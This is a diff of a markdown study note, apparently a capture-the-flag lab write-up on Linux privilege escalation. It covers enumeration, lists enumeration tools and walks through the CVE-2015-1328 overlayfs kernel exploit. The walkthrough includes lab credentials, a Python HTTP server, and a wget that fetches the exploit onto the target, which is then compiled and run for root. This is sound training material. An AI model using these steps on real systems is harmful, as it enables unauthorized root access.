@@ -1,8 +1,8 @@
-## What does "privilege escalation" mean?
+## Privilege Escalation
 
 At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
 
-## Enumeration
+### Enumeration
 Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. 
 
 <details>
@@ -196,3 +196,74 @@ Below is a short example used to find files that have the SUID bit set. The SUID
 </details>
 
 ![alt text](image-2.png)
+
+### Automated Enumeration Tools
+
+Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
+
+The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.
+
+-  LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+-  LinEnum: https://github.com/rebootuser/LinEnum
+-  LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+-  Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+-  Linux Priv Checker: https://github.com/linted/linuxprivchecker 
+
+## Privilege Escalation: Kernel Exploits
+- Username: karen
+- Password: Password1
+
+First, access to the machine over SSH
+
+`sudo openvpn nguyenlong05.ovpn`
+
+`ssh karen@10.10.230.143`
+
+Once connected, run the following command to gather system details:
+
+```
+$ hostnamectl
+   Static hostname: wade7363
+         Icon name: computer-vm
+           Chassis: vm
+           Boot ID: 562b28fdff4045a1a0a1684e8d8c80c6
+  Operating System: Ubuntu 14.04 LTS
+            Kernel: Linux 3.13.0-24-generic
+      Architecture: x86_64
+```
+
+Now we could identify the CVE for kernel exploit
+
+![alt text](image-3.png)
+```
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+# Date: 2015-06-15
+# Exploit Author: rebel
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/C
+VE-2015-1328.html)
+```
+
+Download the script https://www.exploit-db.com/exploits/37292 
+
+Now we check the ip address by the `ifconfig` command
+
+![alt text](image-4.png)
+
+Starts a HTTP server using Python. By default, the server listens on port 8000
+
+`python3 -m http.server`
+
+On the machine, we can see it can't create or write file on target system, but we can move to /tmp directory to do it
+
+`cd /tmp`
+
+Now we transfer the exploit to target system `wget http://10.17.21.74:8000/37292.c` and complie it: `gcc 37292.c -o bocchitherock`, make it executable `chmod +x bocchitherock` and run the script `./bocchitherock`
+
+![alt text](image-6.png)
+
+![alt text](image-7.png)
+
+## Privilege Escalation: Sudo
+
